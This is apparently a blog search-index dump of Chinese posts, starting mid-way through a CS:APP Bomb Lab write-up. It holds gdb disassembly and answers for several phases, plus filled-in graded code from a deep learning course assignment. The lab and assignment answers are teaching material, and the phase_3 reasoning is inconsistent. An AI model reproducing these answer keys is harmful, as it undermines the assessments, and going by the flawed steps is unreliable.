$0x5,%ebx0x000000000040114b &lt;+87&gt;: jle 0x401135 &lt;phase_6+65&gt;0x000000000040114d &lt;+89&gt;: add $0x4,%r130x0000000000401151 &lt;+93&gt;: jmp 0x401114 &lt;phase_6+32&gt; 由下面代码可以看出，对输入的6个数进行了映射，12345678``` 0x000000000040115b &lt;+103&gt;: mov $0x7,%ecx 0x0000000000401160 &lt;+108&gt;: mov %ecx,%edx 0x0000000000401162 &lt;+110&gt;: sub (%rax),%edx 0x0000000000401164 &lt;+112&gt;: mov %edx,(%rax) 0x0000000000401166 &lt;+114&gt;: add $0x4,%rax 0x000000000040116a &lt;+118&gt;: cmp %rsi,%rax 0x000000000040116d &lt;+121&gt;: jne 0x401160 &lt;phase_6+108&gt; 下面的代码，按照输入的6个数映射后的结果，取链表中对应的元素的6个指针放在一个数组中。1234567891011121314151617180x000000000040116f &lt;+123&gt;: mov $0x0,%esi 0x0000000000401174 &lt;+128&gt;: jmp 0x401197 &lt;phase_6+163&gt; 0x0000000000401176 &lt;+130&gt;: mov 0x8(%rdx),%rdx 0x000000000040117a &lt;+134&gt;: add $0x1,%eax 0x000000000040117d &lt;+137&gt;: cmp %ecx,%eax 0x000000000040117f &lt;+139&gt;: jne 0x401176 &lt;phase_6+130&gt; 0x0000000000401181 &lt;+141&gt;: jmp 0x401188 &lt;phase_6+148&gt; 0x0000000000401183 &lt;+143&gt;: mov $0x6032d0,%edx 0x0000000000401188 &lt;+148&gt;: mov %rdx,0x20(%rsp,%rsi,2) 0x000000000040118d &lt;+153&gt;: add $0x4,%rsi 0x0000000000401191 &lt;+157&gt;: cmp $0x18,%rsi 0x0000000000401195 &lt;+161&gt;: je 0x4011ab &lt;phase_6+183&gt; 0x0000000000401197 &lt;+163&gt;: mov (%rsp,%rsi,1),%ecx 0x000000000040119a &lt;+166&gt;: cmp $0x1,%ecx 0x000000000040119d &lt;+169&gt;: jle 0x401183 &lt;phase_6+143&gt; 0x000000000040119f &lt;+171&gt;: mov $0x1,%eax 0x00000000004011a4 &lt;+176&gt;: mov $0x6032d0,%edx 0x00000000004011a9 &lt;+181&gt;: jmp 0x401176 &lt;phase_6+130&gt; 该链表头指针为$0x6032d0,查看得知该链表元素为1234567891011121314151617181920212223242526(gdb) p /x 0x6032d0$1 = 0x6032d0(gdb) p /x *0x6032d0$2 = 0x14c(gdb) p /x *(0x6032d0 + 8)$3 = 0x6032e0(gdb) p /x *(0x6032e0)$4 = 0xa8(gdb) p /x *(0x6032e0 + 8)$5 = 0x6032f0(gdb) p /x *(0x6032f0)$6 = 0x39c(gdb) p /x *(0x6032f0 + 8)$7 = 0x603300(gdb) p /x *(0x603300)$8 = 0x2b3(gdb) p /x *(0x603300 + 8)$9 = 0x603310(gdb) p /x *(0x603310)$10 = 0x1dd(gdb) p /x *(0x603310 + 8)$11 = 0x603320(gdb) p /x *(0x603320)$12 = 0x1bb(gdb) p /x *(0x603320 + 8)$13 = 0x0 之后的代码中，可以看出，用按顺序选出的节点指针，建立一个新链表，该链表为降序.1234567891011121314151617181920210x00000000004011ab &lt;+183&gt;: mov 0x20(%rsp),%rbx0x00000000004011b0 &lt;+188&gt;: lea 0x28(%rsp),%rax0x00000000004011b5 &lt;+193&gt;: lea 0x50(%rsp),%rsi0x00000000004011ba &lt;+198&gt;: mov %rbx,%rcx0x00000000004011bd &lt;+201&gt;: mov (%rax),%rdx0x00000000004011c0 &lt;+204&gt;: mov %rdx,0x8(%rcx)0x00000000004011c4 &lt;+208&gt;: add $0x8,%rax0x00000000004011c8 &lt;+212&gt;: cmp %rsi,%rax0x00000000004011cb &lt;+215&gt;: je 0x4011d2 &lt;phase_6+222&gt;0x00000000004011cd &lt;+217&gt;: mov %rdx,%rcx0x00000000004011d0 &lt;+220&gt;: jmp 0x4011bd &lt;phase_6+201&gt;0x00000000004011d2 &lt;+222&gt;: movq $0x0,0x8(%rdx)0x00000000004011da &lt;+230&gt;: mov $0x5,%ebp0x00000000004011df &lt;+235&gt;: mov 0x8(%rbx),%rax0x00000000004011e3 &lt;+239&gt;: mov (%rax),%eax0x00000000004011e5 &lt;+241&gt;: cmp %eax,(%rbx)0x00000000004011e7 &lt;+243&gt;: jge 0x4011ee &lt;phase_6+250&gt;0x00000000004011e9 &lt;+245&gt;: callq 0x40143a &lt;explode_bomb&gt;0x00000000004011ee &lt;+250&gt;: mov 0x8(%rbx),%rbx0x00000000004011f2 &lt;+254&gt;: sub $0x1,%ebp0x00000000004011f5 &lt;+257&gt;: jne 0x4011df &lt;phase_6+235&gt; 要使链表为降序，映射后的6个数应该为3，4，5，6，1，2，那么原输入应该为4，3，2，1，6，5 到此，二进制炸弹的解码就结束了，改实验具有一定的难度，十分考验逻辑推理和汇编理解能力.","link":"/2018/11/09/Bomb_lab/"},{"title":"DeepLearning1","text":"神经网络正向及反向传播核心算法 Logistics regression作业123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252import numpy as npimport matplotlib.pyplot as pltimport matplotlibimport h5pyfrom scipy import ndimagefrom PIL import Imagefrom lr_utils import load_datasetimport scipyget_ipython().run_line_magic('matplotlib', 'inline')train_set_x_orig, train_set_y, test_set_x_orig, test_set_y, classes = load_dataset()index = 7plt.imshow(train_set_x_orig[index])print (\"y = \" + str(train_set_y[:, index]) + \", it's a '\" + classes[np.squeeze(train_set_y[:, index])].decode(\"utf-8\") + \"' picture.\")train_set_x_orig.shapetrain_set_y.shapeclasses.shapetrain_set_ym_train = train_set_x_orig.shape[0]m_test = test_set_x_orig.shape[0]num_px = train_set_x_orig.shape[1]print (\"Number of training examples: m_train = \" + str(m_train))print (\"Number of testing examples: m_test = \" + str(m_test))print (\"Height/Width of each image: num_px = \" + str(num_px))print (\"Each image is of size: (\" + str(num_px) + \", \" + str(num_px) + \", 3)\")print (\"train_set_x shape: \" + str(train_set_x_orig.shape))print (\"train_set_y shape: \" + str(train_set_y.shape))print (\"test_set_x shape: \" + str(test_set_x_orig.shape))print (\"test_set_y shape: \" + str(test_set_y.shape))### START CODE HERE ### (≈ 2 lines of code)train_set_x_flatten = train_set_x_orig.reshape(train_set_x_orig.shape[0], -1).Ttest_set_x_flatten = test_set_x_orig.reshape(test_set_x_orig.shape[0], -1).T### END CODE HERE ###print (\"train_set_x_flatten shape: \" + str(train_set_x_flatten.shape))print (\"train_set_y shape: \" + str(train_set_y.shape))print (\"test_set_x_flatten shape: \" + str(test_set_x_flatten.shape))print (\"test_set_y shape: \" + str(test_set_y.shape))print (\"sanity check after reshaping: \" + str(train_set_x_flatten[0:5,0]))train_set_x = train_set_x_flatten/255.test_set_x = test_set_x_flatten/255.def sigmoid(z): s = 1/(1+np.exp(-z)) return sprint (\"sigmoid([0, 2]) = \" + str(sigmoid(np.array([0,2]))))def initialize_with_zeros(dim): w = np.zeros((dim, 1)) b = 0 assert(w.shape == (dim, 1)) assert(isinstance(b, float) or isinstance(b, int)) return w, bdim = 2w, b = initialize_with_zeros(dim)print (\"w = \" + str(w))print (\"b = \" + str(b))def propagate(w, b, X, Y): #样本数 m = X.shape[1] A = sigmoid(np.dot(w.T, X) + b) cost = -1 / m * np.sum(Y * np.log(A) + (1 - Y) * np.log(1 - A)) dw = 1 / m * np.dot(X, (A - Y).T) db = 1 / m * np.sum(A - Y) assert(dw.shape == w.shape) assert(db.dtype == float) # 去除cost数组维度 cost = np.squeeze(cost) assert(cost.shape == ()) grads = {\"dw\": dw, \"db\": db} return grads, costw, b, X, Y = np.array([[1],[2]]), 2, np.array([[1,2],[3,4]]), np.array([[1,0]])grads, cost = propagate(w, b, X, Y)print (\"dw = \" + str(grads[\"dw\"]))print (\"db = \" + str(grads[\"db\"]))print (\"cost = \" + str(cost))def optimize(w, b, X, Y, num_iterations, learning_rate, print_cost = False): costs = [] for i in range(num_iterations): grads, cost = propagate(w, b, X, Y) dw = grads[\"dw\"] db = grads[\"db\"] w = w - learning_rate * dw b = b - learning_rate * db if i % 100 == 0: costs.append(cost) if print_cost and i % 100 == 0: print(\"cost after iteration %i: %f\" %(i, cost)) params = {\"w\": w, \"b\": b} grads = {\"dw\": dw, \"db\": db} return params, grads, costs params, grads, costs = optimize(w, b, X, Y, num_iterations= 100, learning_rate = 0.009, print_cost = False)print (\"w = \" + str(params[\"w\"]))print (\"b = \" + str(params[\"b\"]))print (\"dw = \" + str(grads[\"dw\"]))print (\"db = \" + str(grads[\"db\"]))print(costs)def predict(w, b, X): m = X.shape[1] Y_pre = np.zeros((1, m)) w = w.reshape(X.shape[0], 1) A = sigmoid(np.dot(w.T, X) + b) for i in range(A.shape[1]): if A[0, i] &lt;= 0.5: Y_pre[0, i] = 0 else: Y_pre[0, i] = 1 assert(Y_pre.shape == (1, m)) return Y_preprint (\"predictions = \" + str(predict(w, b, X)))# GRADED FUNCTION: modeldef model(X_train, Y_train, X_test, Y_test, num_iterations = 2000, learning_rate = 0.5, print_cost = False): \"\"\" Builds the logistic regression model by calling the function you've implemented previously Arguments: X_train -- training set represented by a numpy array of shape (num_px * num_px * 3, m_train) Y_train -- training labels represented by a numpy array (vector) of shape (1, m_train) X_test -- test set represented by a numpy array of shape (num_px * num_px * 3, m_test) Y_test -- test labels represented by a numpy array (vector) of shape (1, m_test) num_iterations -- hyperparameter representing the number of iterations to optimize the parameters learning_rate -- hyperparameter representing the learning rate used in the update rule of optimize() print_cost -- Set to true to print the cost every 100 iterations Returns: d -- dictionary containing information about the model. \"\"\" ### START CODE HERE ### # initialize parameters with zeros (≈ 1 line of code) w, b = initialize_with_zeros(X_train.shape[0]) # Gradient descent (≈ 1 line of code) parameters, grads, costs = optimize(w, b, X_train, Y_train, num_iterations, learning_rate, print_cost) # Retrieve parameters w and b from dictionary \"parameters\" w = parameters[\"w\"] b = parameters[\"b\"] # Predict test/train set examples (≈ 2 lines of code) Y_prediction_test = predict(w, b, X_test) Y_prediction_train = predict(w, b, X_train) ### END CODE HERE ### # Print train/test Errors print(\"train accuracy: {} %\".format(100 - np.mean(np.abs(Y_prediction_train - Y_train)) * 100)) print(\"test accuracy: {} %\".format(100 - np.mean(np.abs(Y_prediction_test - Y_test)) * 100)) d = {\"costs\": costs, \"Y_prediction_test\": Y_prediction_test, \"Y_prediction_train\" : Y_prediction_train, \"w\" : w, \"b\" : b, \"learning_rate\" : learning_rate, \"num_iterations\": num_iterations} return dd = model(train_set_x, train_set_y, test_set_x, test_set_y, num_iterations = 1500, learning_rate = 0.005, print_cost = True)# Plot learning curve (with costs)costs = np.squeeze(d[\"costs\"])plt.plot(costs)plt.ylabel('cost')plt.xlabel('iterations (per hundreds)')plt.title(\"Learning rate =\" + str(d[\"learning_rate\"]))plt.show()## START CODE HERE ## (PUT YOUR IMAGE NAME) my_image = \"psb.jpeg\" # change this to the name of your image file ## END CODE HERE ### We preprocess the image to fit your algorithm.fname = \"images/\" + my_imageimage = np.array(matplotlib.pyplot.imread(fname))my_image = scipy.misc.imresize(image, size=(num_px,num_px)).reshape((1, num_px*num_px*3)).Tmy_predicted_image = predict(d[\"w\"], d[\"b\"], my_image)plt.imshow(image)print(\"y = \" + str(np.squeeze(my_predicted_image)) + \", your algorithm predicts a \\\"\" + classes[int(np.squeeze(my_predicted_image)),].decode(\"utf-8\") + \"\\\" picture.\") 简单NN算法123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357import numpy as npimport matplotlib.pyplot as pltfrom testCases import *import sklearnimport sklearn.datasetsimport sklearn.linear_modelfrom planar_utils import plot_decision_boundary, sigmoid, load_planar_dataset, load_extra_datasetsget_ipython().run_line_magic('matplotlib', 'inline')np.random.seed(1)X, Y = load_planar_dataset()X.shapeY.shapeplt.scatter(X[0, :], X[1, :], c=Y.reshape(400, ), s=40, cmap=plt.cm.Spectral)### START CODE HERE ### (≈ 3 lines of code)shape_X = X.shapeshape_Y = Y.shapem = shape_X[1] # training set size### END CODE HERE ###print ('The shape of X is: ' + str(shape_X))print ('The shape of Y is: ' + str(shape_Y))print ('I have m = %d training examples!' % (m))clf = sklearn.linear_model.LogisticRegressionCV()clf.fit(X.T, Y.T)# Plot the decision boundary for logistic regressionplot_decision_boundary(lambda x: clf.predict(x), X, Y.ravel())plt.title(\"Logistic Regression\")# Print accuracyLR_predictions = clf.predict(X.T)print ('Accuracy of logistic regression: %d ' % float((np.dot(Y,LR_predictions) + np.dot(1-Y,1-LR_predictions))/float(Y.size)*100) + '% ' + \"(percentage of correctly labelled datapoints)\")def layer_sizes(X, Y): \"\"\" Arguments: X -- input dataset of shape (input size, number of examples) Y -- labels of shape (output size, number of examples) Returns: n_x -- the size of the input layer n_h -- the size of the hidden layer n_y -- the size of the output layer \"\"\" ### START CODE HERE ### (≈ 3 lines of code) n_x = X.shape[0] # size of input layer n_h = 4 n_y = Y.shape[0] # size of output layer ### END CODE HERE ### return (n_x, n_h, n_y)X_assess, Y_assess = layer_sizes_test_case()(n_x, n_h, n_y) = layer_sizes(X_assess, Y_assess)print(\"The size of the input layer is: n_x = \" + str(n_x))print(\"The size of the hidden layer is: n_h = \" + str(n_h))print(\"The size of the output layer is: n_y = \" + str(n_y))def initialize_parameters(n_x, n_h, n_y): \"\"\" Argument: n_x -- size of the input layer n_h -- size of the hidden layer n_y -- size of the output layer Returns: params -- python dictionary containing your parameters: W1 -- weight matrix of shape (n_h, n_x) b1 -- bias vector of shape (n_h, 1) W2 -- weight matrix of shape (n_y, n_h) b2 -- bias vector of shape (n_y, 1) \"\"\" np.random.seed(2) W1 = np.random.randn(n_h, n_x) * 0.01 b1 = np.zeros((n_h, 1)) W2 = np.random.randn(n_y, n_h) * 0.01 b2 = np.zeros((n_y, 1)) assert (W1.shape == (n_h, n_x)) assert (b1.shape == (n_h, 1)) assert (W2.shape == (n_y, n_h)) assert (b2.shape == (n_y, 1)) parameters = {\"W1\": W1, \"b1\": b1, \"W2\": W2, \"b2\": b2} return parametersn_x, n_h, n_y = initialize_parameters_test_case()parameters = initialize_parameters(n_x, n_h, n_y)print(\"W1 = \" + str(parameters[\"W1\"]))print(\"b1 = \" + str(parameters[\"b1\"]))print(\"W2 = \" + str(parameters[\"W2\"]))print(\"b2 = \" + str(parameters[\"b2\"]))def sig(z): s = 1/(1+np.exp(-z)) return sdef forward_propagation(X, parameters): W1 = parameters['W1'] b1 = parameters['b1'] W2 = parameters['W2'] b2 = parameters['b2'] Z1 = np.dot(W1, X) + b1 A1 = np.tanh(Z1) Z2 = np.dot(W2, A1) + b2 A2 = sig(Z2) assert(A2.shape == (1, X.shape[1])) cache = {\"Z1\": Z1, \"A1\": A1, \"Z2\": Z2, \"A2\": A2} return A2, cacheX_assess, parameters = forward_propagation_test_case()# print(\"X_assess:\", X_assess)# print(\"parameters:\", parameters)A2, cache = forward_propagation(X_assess, parameters)# Note: we use the mean here just to make sure that your output matches ours. print(\"mean:\", np.mean(cache['Z1']) ,np.mean(cache['A1']),np.mean(cache['Z2']),np.mean(cache['A2']))def compute_cost(A2, Y, parameters): m = Y.shape[1] # numbe of examples logprobs = np.multiply(np.log(A2), Y) + np.multiply((1 - Y), np.log(1 - A2)) cost = -1/m * np.sum(logprobs) cost = np.squeeze(cost) assert(isinstance(cost, float)) return costA2, Y_assess, parameters = compute_cost_test_case()print(\"cost = \" + str(compute_cost(A2, Y_assess, parameters)))def backward_propagation(parameters, cache, X, Y): m = X.shape[1] # First, retrieve W1 and W2 from the dictionary \"parameters\". ### START CODE HERE ### (≈ 2 lines of code) W1 = parameters['W1'] W2 = parameters['W2'] ### END CODE HERE ### # Retrieve also A1 and A2 from dictionary \"cache\". ### START CODE HERE ### (≈ 2 lines of code) A1 = cache['A1'] A2 = cache['A2'] ### END CODE HERE ### dZ2 = A2 - Y dW2 = 1 / m * np.dot(dZ2, A1.T) db2 = 1 / m * np.sum(dZ2, axis=1, keepdims=True) dZ1 = np.dot(W2.T, dZ2) * (1 - np.power(A1, 2)) dW1 = 1/m * np.dot(dZ1, X.T) db1 = 1/m * np.sum(dZ1, axis=1, keepdims=True) grads = {\"dW1\": dW1, \"db1\": db1, \"dW2\": dW2, \"db2\": db2} return gradsparameters, cache, X_assess, Y_assess = backward_propagation_test_case()grads = backward_propagation(parameters, cache, X_assess, Y_assess)print (\"dW1 = \"+ str(grads[\"dW1\"]))print (\"db1 = \"+ str(grads[\"db1\"]))print (\"dW2 = \"+ str(grads[\"dW2\"]))print (\"db2 = \"+ str(grads[\"db2\"]))def update_parameters(parameters, grads, learning_rate = 1.2): \"\"\" Updates parameters using the gradient descent update rule given above Arguments: parameters -- python dictionary containing your parameters grads -- python dictionary containing your gradients Returns: parameters -- python dictionary containing your updated parameters \"\"\" # Retrieve each parameter from the dictionary \"parameters\" ### START CODE HERE ### (≈ 4 lines of code) W1 = parameters['W1'] b1 = parameters['b1'] W2 = parameters['W2'] b2 = parameters['b2'] ### END CODE HERE ### # Retrieve each gradient from the dictionary \"grads\" ### START CODE HERE ### (≈ 4 lines of code) dW1 = grads[\"dW1\"] db1 = grads[\"db1\"] dW2 = grads[\"dW2\"] db2 = grads[\"db2\"] ## END CODE HERE ### # Update rule for each parameter ### START CODE HERE ### (≈ 4 lines of code) W1 -= learning_rate * dW1 b1 -= learning_rate * db1 W2 -= learning_rate * dW2 b2 -= learning_rate * db2 ### END CODE HERE ### parameters = {\"W1\": W1, \"b1\": b1, \"W2\": W2, \"b2\": b2} return parametersparameters, grads = update_parameters_test_case()parameters = update_parameters(parameters, grads)print(\"W1 = \" + str(parameters[\"W1\"]))print(\"b1 = \" + str(parameters[\"b1\"]))print(\"W2 = \" + str(parameters[\"W2\"]))print(\"b2 = \" + str(parameters[\"b2\"]))def nn_model(X, Y, n_h, num_iterations = 10000, print_cost = False): np.random.seed(3) n_x = layer_sizes(X, Y)[0] n_y = layer_sizes(X, Y)[2] parameters = initialize_parameters(n_x, n_h, n_y) W1 = parameters['W1'] b1 = parameters['b1'] W2 = parameters['W2'] b2 = parameters['b2'] for i in range(0, num_iterations): A2, cache = forward_propagation(X, parameters) cost = compute_cost(A2, Y, parameters) grads = backward_propagation(parameters, cache, X, Y) parameters = update_parameters(parameters, grads) if print_cost and i % 100 == 0: print(\"cost after iteration %i: %f\" %(i, cost)) return parametersX_assess, Y_assess = nn_model_test_case()parameters = nn_model(X_assess, Y_assess, 4, num_iterations=10, print_cost=False)print(\"W1 = \" + str(parameters[\"W1\"]))print(\"b1 = \" + str(parameters[\"b1\"]))print(\"W2 = \" + str(parameters[\"W2\"]))print(\"b2 = \" + str(parameters[\"b2\"]))def predict(parameters, X): \"\"\" Using the learned parameters, predicts a class for each example in X Arguments: parameters -- python dictionary containing your parameters X -- input data of size (n_x, m) Returns predictions -- vector of predictions of our model (red: 0 / blue: 1) \"\"\" # Computes probabilities using forward propagation, and classifies to 0/1 using 0.5 as the threshold. ### START CODE HERE ### (≈ 2 lines of code) A2, cache = forward_propagation(X, parameters) predictions = np.array( [1 if x &gt;0.5 else 0 for x in A2.reshape(-1,1)] ).reshape(A2.shape) # 这一行代码的作用详见下面代码示例 ### END CODE HERE ### return predictionsparameters, X_assess = predict_test_case()predictions = predict(parameters, X_assess)print(\"predictions:\", predictions)print(\"predictions mean = \" + str(np.mean(predictions)))parameters = nn_model(X, Y, n_h = 4, num_iterations = 10000, print_cost=True)plot_decision_boundary(lambda x: predict(parameters, x.T), X, Y.ravel())plt.title(\"Decision Boundary for hidden layer size \" + str(4))X.shapepredictions = predict(parameters, X)print ('Accuracy: %d' % float((np.dot(Y,predictions.T) + np.dot(1-Y,1-predictions.T))/float(Y.size)*100) + '%')plt.figure(figsize=(16, 32))hidden_layer_sizes = [1, 2, 3, 4, 5, 10, 20]for i, n_h in enumerate(hidden_layer_sizes): plt.subplot(5, 2, i+1) plt.title('Hidden Layer of size %d' % n_h) parameters = nn_model(X, Y, n_h, num_iterations = 5000) plot_decision_boundary(lambda x: predict(parameters, x.T), X, Y.ravel()) predictions = predict(parameters, X) accuracy = float((np.dot(Y,predictions.T) + np.dot(1-Y,1-predictions.T))/float(Y.size)*100) print (\"Accuracy for {} hidden units: {} %\".format(n_h, accuracy))","link":"/2019/03/09/DeepLearning1/"},{"title":"Bomb_lab2","text":"实验步骤 准备工作使用tar -vxf将炸弹压缩包解压,cd进入,可以从bomb.c中看出实验的用意以及程序的大致逻辑,bomb为可执行程序,使用gdb调试该程序.1234(gdb) b read_line Breakpoint 1 at 0x40155c(gdb) b explode_bomb Breakpoint 2 at 0x4014e4 给read_line函数打上断点,以便每次输入运行一关.给explode_bomb打上断点,以便在炸弹爆炸前可以处理. phase_1获得phase_1汇编代码1234567891011(gdb) disas phase_1Dump of assembler code for function phase_1: 0x0000000000400e80 &lt;+0&gt;: sub $0x8,%rsp 0x0000000000400e84 &lt;+4&gt;: mov $0x4024a0,%esi 0x0000000000400e89 &lt;+9&gt;: callq 0x40127e &lt;strings_not_equal&gt; 0x0000000000400e8e &lt;+14&gt;: test %eax,%eax 0x0000000000400e90 &lt;+16&gt;: je 0x400e97 &lt;phase_1+23&gt; 0x0000000000400e92 &lt;+18&gt;: callq 0x4014e4 &lt;explode_bomb&gt; 0x0000000000400e97 &lt;+23&gt;: add $0x8,%rsp 0x0000000000400e9b &lt;+27&gt;: retq End of assembler dump. 可见,此题是将我们输入的字符串与地址0x4024a0处字符串比较,不等则爆炸.查看该字符串.12(gdb) x/s 0x4024a00x4024a0 &lt;__dso_handle+344&gt;: \"We have to stand with our North Korean allies.\" 那么答案是We have to stand with our North Korean allies. phase_21234567891011121314151617181920212223242526272829(gdb) disas phase_2Dump of assembler code for function phase_2: 0x0000000000400e9c &lt;+0&gt;: push %rbp 0x0000000000400e9d &lt;+1&gt;: push %rbx 0x0000000000400e9e &lt;+2&gt;: sub $0x28,%rsp 0x0000000000400ea2 &lt;+6&gt;: mov %rsp,%rsi 0x0000000000400ea5 &lt;+9&gt;: callq 0x40151a &lt;read_six_numbers&gt; 0x0000000000400eaa &lt;+14&gt;: cmpl $0x1,(%rsp) 0x0000000000400eae &lt;+18&gt;: je 0x400ed0 &lt;phase_2+52&gt; 0x0000000000400eb0 &lt;+20&gt;: callq 0x4014e4 &lt;explode_bomb&gt; 0x0000000000400eb5 &lt;+25&gt;: jmp 0x400ed0 &lt;phase_2+52&gt; 0x0000000000400eb7 &lt;+27&gt;: mov -0x4(%rbx),%eax 0x0000000000400eba &lt;+30&gt;: add %eax,%eax 0x0000000000400ebc &lt;+32&gt;: cmp %eax,(%rbx) 0x0000000000400ebe &lt;+34&gt;: je 0x400ec5 &lt;phase_2+41&gt; 0x0000000000400ec0 &lt;+36&gt;: callq 0x4014e4 &lt;explode_bomb&gt; 0x0000000000400ec5 &lt;+41&gt;: add $0x4,%rbx 0x0000000000400ec9 &lt;+45&gt;: cmp %rbp,%rbx 0x0000000000400ecc &lt;+48&gt;: jne 0x400eb7 &lt;phase_2+27&gt; 0x0000000000400ece &lt;+50&gt;: jmp 0x400edc &lt;phase_2+64&gt; 0x0000000000400ed0 &lt;+52&gt;: lea 0x4(%rsp),%rbx 0x0000000000400ed5 &lt;+57&gt;: lea 0x18(%rsp),%rbp 0x0000000000400eda &lt;+62&gt;: jmp 0x400eb7 &lt;phase_2+27&gt; 0x0000000000400edc &lt;+64&gt;: add $0x28,%rsp---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit--- 0x0000000000400ee0 &lt;+68&gt;: pop %rbx 0x0000000000400ee1 &lt;+69&gt;: pop %rbp 0x0000000000400ee2 &lt;+70&gt;: retq End of assembler dump. +3处发现在栈中开辟了0x28的内存区域.然后将%rsp的值传给%rsi作为参数传给函数read_six_numbers,可以看出应该使用开辟的空闲内存做数组,记数组为r,读取六个数字.将(%rsp)和0x1比较,如果不等,就会爆炸,(％rsp)为数组首元,故r[0]＝１;跳转到+52,将r[1]地址赋给%rbx,将r6地址赋给%rbp,跳到+27,将%eax设为%rbx指向的前一个数,此时为r[0],比较r[1]和2*r[0]是否相等,不等则爆炸.跳转到+41,％rbx+4,比较%rbx和%rbp,不等跳转到+27,重复,等则跳转到+64结束,成功.可以看出，这是一个循环比较.等价于下面的c语a言 1234for(int *b = &amp;r[1]; b != &amp;r[6]; b++){ if(*b != 2 * (*(b - 1))) call explode_bomb; 故答案应该为1 2 4 8 16 32. phase_312340x0000000000400ef1 &lt;+14&gt;: mov $0x4027cd,%esi0x0000000000400ef6 &lt;+19&gt;: mov $0x0,%eax0x0000000000400efb &lt;+24&gt;: callq 0x400ba0 &lt;__isoc99_sscanf@plt&gt;0x0000000000400f00 &lt;+29&gt;: cmp $0x1,%eax 查看0x4027cd,12(gdb) x/s 0x4027cd0x4027cd: \"%d %d\" 可知,应该是读入了两个整数.1234567891011121314151617181920212223242526272829303132 0x0000000000400f15 &lt;+50&gt;: jmpq *0x402500(,%rax,8) 0x0000000000400f1c &lt;+57&gt;: mov $0x0,%eax 0x0000000000400f21 &lt;+62&gt;: jmp 0x400f28 &lt;phase_3+69&gt; 0x0000000000400f23 &lt;+64&gt;: mov $0x19c,%eax 0x0000000000400f28 &lt;+69&gt;: sub $0xcd,%eax 0x0000000000400f2d &lt;+74&gt;: jmp 0x400f34 &lt;phase_3+81&gt; 0x0000000000400f2f &lt;+76&gt;: mov $0x0,%eax 0x0000000000400f34 &lt;+81&gt;: add $0x29b,%eax 0x0000000000400f39 &lt;+86&gt;: jmp 0x400f40 &lt;phase_3+93&gt; 0x0000000000400f3b &lt;+88&gt;: mov $0x0,%eax---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit--- 0x0000000000400f40 &lt;+93&gt;: sub $0x36f,%eax 0x0000000000400f45 &lt;+98&gt;: jmp 0x400f4c &lt;phase_3+105&gt; 0x0000000000400f47 &lt;+100&gt;: mov $0x0,%eax 0x0000000000400f4c &lt;+105&gt;: add $0x36f,%eax 0x0000000000400f51 &lt;+110&gt;: jmp 0x400f58 &lt;phase_3+117&gt; 0x0000000000400f53 &lt;+112&gt;: mov $0x0,%eax 0x0000000000400f58 &lt;+117&gt;: sub $0x36f,%eax 0x0000000000400f5d &lt;+122&gt;: jmp 0x400f64 &lt;phase_3+129&gt; 0x0000000000400f5f &lt;+124&gt;: mov $0x0,%eax 0x0000000000400f64 &lt;+129&gt;: add $0x36f,%eax 0x0000000000400f69 &lt;+134&gt;: jmp 0x400f70 &lt;phase_3+141&gt; 0x0000000000400f6b &lt;+136&gt;: mov $0x0,%eax 0x0000000000400f70 &lt;+141&gt;: sub $0x36f,%eax 0x0000000000400f75 &lt;+146&gt;: jmp 0x400f81 &lt;phase_3+158&gt; 0x0000000000400f77 &lt;+148&gt;: callq 0x4014e4 &lt;explode_bomb&gt; 0x0000000000400f7c &lt;+153&gt;: mov $0x0,%eax 0x0000000000400f81 &lt;+158&gt;: cmpl $0x5,0xc(%rsp) 0x0000000000400f86 &lt;+163&gt;: jg 0x400f8e &lt;phase_3+171&gt; 0x0000000000400f88 &lt;+165&gt;: cmp 0x8(%rsp),%eax 0x0000000000400f8c &lt;+169&gt;: je 0x400f93 &lt;phase_3+176&gt; 0x0000000000400f8e &lt;+171&gt;: callq 0x4014e4 &lt;explode_bomb&gt; 由这段汇编代码可知,这是一段switch语句,使用输入的第一个值作为key,经过对应跳转位置的操作后应与第二个数相等.12(gdb) p/x *（0x402500 + 32）$1 = 0x400f47 那么第一个数为0时,跳转到0x400f23处,那么第二个数应该为此处的0x0,故一组答案为4 0; phase_4123456789101112131415161718192021222324(gdb) disas phase_4Dump of assembler code for function phase_4: 0x0000000000400fd0 &lt;+0&gt;: sub $0x18,%rsp 0x0000000000400fd4 &lt;+4&gt;: lea 0xc(%rsp),%rcx 0x0000000000400fd9 &lt;+9&gt;: lea 0x8(%rsp),%rdx 0x0000000000400fde &lt;+14&gt;: mov $0x4027cd,%esi 0x0000000000400fe3 &lt;+19&gt;: mov $0x0,%eax 0x0000000000400fe8 &lt;+24&gt;: callq 0x400ba0 &lt;__isoc99_sscanf@plt&gt; 0x0000000000400fed &lt;+29&gt;: cmp $0x2,%eax 0x0000000000400ff0 &lt;+32&gt;: jne 0x400ffe &lt;phase_4+46&gt; 0x0000000000400ff2 &lt;+34&gt;: mov 0xc(%rsp),%eax 0x0000000000400ff6 &lt;+38&gt;: sub $0x2,%eax 0x0000000000400ff9 &lt;+41&gt;: cmp $0x2,%eax 0x0000000000400ffc &lt;+44&gt;: jbe 0x401003 &lt;phase_4+51&gt; 0x0000000000400ffe &lt;+46&gt;: callq 0x4014e4 &lt;explode_bomb&gt; 0x0000000000401003 &lt;+51&gt;: mov 0xc(%rsp),%esi 0x0000000000401007 &lt;+55&gt;: mov $0x9,%edi 0x000000000040100c &lt;+60&gt;: callq 0x400f98 &lt;func4&gt; 0x0000000000401011 &lt;+65&gt;: cmp 0x8(%rsp),%eax 0x0000000000401015 &lt;+69&gt;: je 0x40101c &lt;phase_4+76&gt; 